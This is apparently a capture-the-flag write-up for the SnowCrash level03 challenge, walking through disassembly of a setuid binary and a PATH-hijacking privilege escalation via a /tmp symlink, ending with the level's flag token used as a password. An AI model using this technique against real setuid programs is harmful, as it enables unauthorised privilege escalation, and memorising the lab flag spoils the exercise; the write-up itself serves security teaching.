@@ -1,0 +1,107 @@
+When we log in as level03 user we can find a binary file in the home directory named level03 if we execute the ls command we get the following result :
+
+level03@SnowCrash:~$ ls -asl
+total 24
+ 0 dr-x------ 1 level03 level03  120 Mar  5  2016 .
+ 0 d--x--x--x 1 root    users    340 Aug 30  2015 ..
+ 4 -r-x------ 1 level03 level03  220 Apr  3  2012 .bash_logout
+ 4 -r-x------ 1 level03 level03 3518 Aug 30  2015 .bashrc
+12 -rwsr-sr-x 1 flag03  level03 8627 Mar  5  2016 level03
+ 4 -r-x------ 1 level03 level03  675 Apr  3  2012 .profile
+
+ So we can execute the level03 binary file. When we execute the file it says Exploit me and that's it. The binary do not accept any command line arguments nor any does it takes any input (such as reading standard input / outputs).
+
+ Fortunately the Snow Crash ISO contain the program GDB so when we run GDB and decimpile the main function. We get the following output:
+
+ --------------------------------------------------------
+ level03@SnowCrash:~$ gdb -q ./level03 
+Reading symbols from /home/user/level03/level03...done.
+(gdb) disassemble main
+Dump of assembler code for function main:
+   0x080484a4 <+0>:     push   %ebp
+   0x080484a5 <+1>:     mov    %esp,%ebp
+   0x080484a7 <+3>:     and    $0xfffffff0,%esp
+   0x080484aa <+6>:     sub    $0x20,%esp
+   0x080484ad <+9>:     call   0x80483a0 <getegid@plt>
+   0x080484b2 <+14>:    mov    %eax,0x18(%esp)
+   0x080484b6 <+18>:    call   0x8048390 <geteuid@plt>
+   0x080484bb <+23>:    mov    %eax,0x1c(%esp)
+   0x080484bf <+27>:    mov    0x18(%esp),%eax
+   0x080484c3 <+31>:    mov    %eax,0x8(%esp)
+   0x080484c7 <+35>:    mov    0x18(%esp),%eax
+   0x080484cb <+39>:    mov    %eax,0x4(%esp)
+   0x080484cf <+43>:    mov    0x18(%esp),%eax
+   0x080484d3 <+47>:    mov    %eax,(%esp)
+   0x080484d6 <+50>:    call   0x80483e0 <setresgid@plt>
+   0x080484db <+55>:    mov    0x1c(%esp),%eax
+   0x080484df <+59>:    mov    %eax,0x8(%esp)
+   0x080484e3 <+63>:    mov    0x1c(%esp),%eax
+   0x080484e7 <+67>:    mov    %eax,0x4(%esp)
+   0x080484eb <+71>:    mov    0x1c(%esp),%eax
+   0x080484ef <+75>:    mov    %eax,(%esp)
+   0x080484f2 <+78>:    call   0x8048380 <setresuid@plt>
+   0x080484f7 <+83>:    movl   $0x80485e0,(%esp)
+   0x080484fe <+90>:    call   0x80483b0 <system@plt>
+   0x08048503 <+95>:    leave  
+   0x08048504 <+96>:    ret    
+End of assembler dump.
+(gdb) 
+-------------------------------------------------------
+
+And from this decompilation we can see that the following functions are called
+
+getegid
+geteuid
+setresgid
+setresuid
+system
+
+To better visualize this code we can use a decompiler that can reconstruct this code to more higher level code, such as C / C++.
+
+Some of the tools that can do that are Ghidra and RetDec (RetDec git) there are other tools that can also decompile and show semi higher level code which are Radare / Cutter, Binary Ninja which are also really great tools. But i prefere the decompilation of Ghidra and RetDec as they can generate the most human readable code (in my opinion)
+
+You can also use an online version of RetDec which you can find at http://retdec.hostbin.org/ (for this exercise it is convinient)
+
+The decompiled code from Ghidra is as follows :
+
+------------------------------------------------
+int main(int argc,char **argv,char **envp)
+{
+  __gid_t __rgid;
+  __uid_t __ruid;
+  int iVar1;
+  gid_t gid;
+  uid_t uid;
+  
+  __rgid = getegid();
+  __ruid = geteuid();
+  setresgid(__rgid,__rgid,__rgid);
+  setresuid(__ruid,__ruid,__ruid);
+  iVar1 = system("/usr/bin/env echo Exploit me");
+  return iVar1;
+}
+-------------------------------------------------
+
+So from this code we can clearly see that the program is setting all user id to our effective ID and all group ids to our GUID and then it calls /usr/bin/env which then calls echo .
+
+So just by looking at it we can already guess that env has to guess where echo is based on the PATH environment variable because the path to echo is not absolute. What this means it that if we change the PATH environment variable we can control what is executed. 
+
+What we need to execute is the program getflag which is located in /bin
+One thing to remember is that the program that is executed in the end must be named echo as the program env searches for echo in all the paths in PATH environment variable.
+
+What we should do is put the getflag somewhere and change it name to echo so that the program env execute our fake echo . In the OS all paths are not writable but we can write in the /tmp directory and one of the easiest way to copy a file and change is to create a symbolic link  and then we change our environment variable PATH so that it has /tmp in it. :
+
+
+level03@SnowCrash:~$ ln -s /bin/getflag /tmp/echo
+level03@SnowCrash:~$ export PATH=/tmp
+
+
+And now if we execute the program level03 we get the following result:
+
+level03@SnowCrash:~$ ./level03
+Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
+
+We can use this flag to log into the level04 account :
+
+level03@SnowCrash:~$ su level04
+Password: qi0maab88jeaj46qoumi7maus
